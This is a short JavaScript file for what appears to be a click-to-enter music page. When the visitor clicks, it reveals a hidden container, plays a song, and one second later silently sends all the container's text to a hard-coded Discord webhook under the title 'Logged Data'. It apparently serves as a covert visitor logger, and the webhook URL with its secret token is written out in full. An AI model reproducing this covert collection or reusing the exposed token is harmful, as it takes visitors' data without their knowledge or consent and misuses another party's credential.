function sendToDiscord() {
  const webhookUrl =
    "https://discord.com/api/webhooks/1409638190633193472/-Q43Lp-Vjc4K7jLFHRZkI_YVJNRVqq2PhBquRwZQ_zqMlRNQ8sEoNNJLmeKdgmJP83Mh";
  const hiddenContainer = document.getElementById("hiddencontainer");
  let content = "";

  hiddenContainer.querySelectorAll("*").forEach((element) => {
    content += element.innerText.trim() + "\n";
  });

  const uniqueContent = Array.from(new Set(content.trim().split("\n"))).join(
    "\n"
  );

  const payload = {
    embeds: [
      {
        title: "Logged Data",
        description: uniqueContent,
        color: 16711680,
      },
    ],
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });
}

function handleUserClick() {
  document.getElementById("flexboxcontainer").style.display = "none";
  document.getElementById("flexboxcontainer").style.width = 0;
  document.getElementById("flexboxcontainer").style.height = 0;

  const hiddenContainer = document.getElementById("hiddencontainer");
  hiddenContainer.style.display = "flex";
  playNextSong();
  setTimeout(() => {
    hiddenContainer.style.opacity = 1;
  }, 50);

  setTimeout(sendToDiscord, 1000);
}

document.addEventListener("DOMContentLoaded", () => {
  document
    .getElementById("flexboxcontainer")
    .addEventListener("click", handleUserClick);
});
